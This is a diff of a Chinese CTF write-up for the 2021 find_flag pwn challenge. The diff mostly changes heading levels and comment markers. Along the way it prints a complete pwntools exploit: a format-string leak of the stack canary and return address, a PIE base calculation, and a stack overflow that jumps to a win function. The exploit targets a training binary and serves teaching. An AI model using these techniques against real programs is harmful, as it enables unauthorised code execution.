@@ -9,15 +9,15 @@ tags: [pwn]
 recommend: 10
 ---
 
-## Pwn-PIE
+### Pwn-PIE
 
 
 
-###  [深育杯 2021] find_flag 题解 PIE
+####  [深育杯 2021] find_flag 题解 PIE
 
 题目连接:https://www.nssctf.cn/problem/774
 
-### 系统保护机制
+#### 系统保护机制
 
 > 什么是系统保护机制？
 
@@ -236,54 +236,54 @@ pip install pwntools
 ```python
 from pwn import *    # 导入 pwntools 所有功能
 
-# 设置目标架构为 amd64（64位）
+## 设置目标架构为 amd64（64位）
 context.arch = 'amd64'
-# 日志级别设为 info（显示成功/错误信息，少一些干扰）
+## 日志级别设为 info（显示成功/错误信息，少一些干扰）
 context.log_level = 'info'
 
-# 加载 ELF 文件，获取符号信息
+## 加载 ELF 文件，获取符号信息
 elf = ELF('./find_flag')
 
-# 连接程序（本地测试用 process，打远程用 remote）
+## 连接程序（本地测试用 process，打远程用 remote）
 p = process('./find_flag')
-# p = remote('node5.anna.nssctf.cn', 28586)  # 远程靶机
+## p = remote('node5.anna.nssctf.cn', 28586)  # 远程靶机
 ```
 
 第 1 步：泄露 Canary 和 PIE 基址
 
 ```python
-# 等待程序输出 "Hi! What's your name? "，然后发送 payload
+## 等待程序输出 "Hi! What's your name? "，然后发送 payload
 p.recvuntil(b"name? ")        # recvuntil = 一直收，直到遇到指定字符串
 
-# %17$p 读第 17 个参数 → Canary
-# %19$p 读第 19 个参数 → 返回地址
+## %17$p 读第 17 个参数 → Canary
+## %19$p 读第 19 个参数 → 返回地址
 payload1 = b"%17$p.%19$p"
 
 p.sendline(payload1)           # 发送 payload 并回车
 
-# 程序会打印: "Nice to meet you, 0xCANARY.0xRETADDR!\n"
-# 我们收 "Nice to meet you, " 之后的内容
+## 程序会打印: "Nice to meet you, 0xCANARY.0xRETADDR!\n"
+## 我们收 "Nice to meet you, " 之后的内容
 p.recvuntil(b"Nice to meet you, ")
 data = p.recvuntil(b"!\n", drop=True)  # 收直到 "!\n"，drop=True 去掉 "!\n"
 
-# data 的内容类似: b"0xabcd1234.0x5678ef00"
-# 用 . 分割成两部分
+## data 的内容类似: b"0xabcd1234.0x5678ef00"
+## 用 . 分割成两部分
 canary_str, ret_str = data.split(b".")
 
-# 把十六进制字符串转成整数
+## 把十六进制字符串转成整数
 canary = int(canary_str, 16)    # 第 1 个 = Canary
 ret_addr = int(ret_str, 16)      # 第 2 个 = 返回地址
 
-# 返回地址 = main+0x146f，所以 PIE 基址 = 返回地址 - 0x146f
+## 返回地址 = main+0x146f，所以 PIE 基址 = 返回地址 - 0x146f
 pie_base = ret_addr - 0x146f
 
-# 有了基址就能算出 win 函数的真实地址
+## 有了基址就能算出 win 函数的真实地址
 win_addr = pie_base + 0x1229
 
-# 用于栈对齐的 ret gadget
+## 用于栈对齐的 ret gadget
 ret_gadget = pie_base + 0x13f8
 
-# 打印出来看看
+## 打印出来看看
 log.success(f"Canary: {hex(canary)}")        # 绿色输出
 log.success(f"PIE base: {hex(pie_base)}")
 log.success(f"Win addr: {hex(win_addr)}")
@@ -292,15 +292,15 @@ log.success(f"Win addr: {hex(win_addr)}")
 第 2 步：构造栈溢出 payload
 
 ```python
-# 等待第二个提示
+## 等待第二个提示
 p.recvuntil(b"Anything else? ")
 
-# 构造 payload：
-# - 0x38 字节填充（从 buffer2 到 canary）
-# - Canary（原样写回，绕过检查）
-# - 8 字节假 RBP（任意值）
-# - ret gadget（修复栈对齐）
-# - win 函数地址
+## 构造 payload：
+## - 0x38 字节填充（从 buffer2 到 canary）
+## - Canary（原样写回，绕过检查）
+## - 8 字节假 RBP（任意值）
+## - ret gadget（修复栈对齐）
+## - win 函数地址
 payload2 = b"A" * 0x38          # 填充 56 字节
 payload2 += p64(canary)         # Canary（8 字节，小端序）
 payload2 += b"B" * 8            # 假 RBP（8 字节）
@@ -309,7 +309,7 @@ payload2 += p64(win_addr)       # win 函数地址
 
 p.sendline(payload2)            # 发送 payload
 
-# 进入交互模式，拿到 flag
+## 进入交互模式，拿到 flag
 p.interactive()
 ```
 
@@ -323,9 +323,9 @@ context.log_level = 'info'
 
 elf = ELF('./find_flag')
 p = process('./find_flag')
-# p = remote('node5.anna.nssctf.cn', 28586)
+## p = remote('node5.anna.nssctf.cn', 28586)
 
-# ======== Step 1: Leak ========
+## ======== Step 1: Leak ========
 p.recvuntil(b"name? ")
 p.sendline(b"%17$p.%19$p")
 
@@ -344,7 +344,7 @@ log.success(f"Canary: {hex(canary)}")
 log.success(f"PIE base: {hex(pie_base)}")
 log.success(f"Win addr: {hex(win_addr)}")
 
-# ======== Step 2: Overflow ========
+## ======== Step 2: Overflow ========
 p.recvuntil(b"Anything else? ")
 payload2 = b"A" * 0x38 + p64(canary) + b"B" * 8 + p64(ret_gadget) + p64(win_addr)
 p.sendline(payload2)
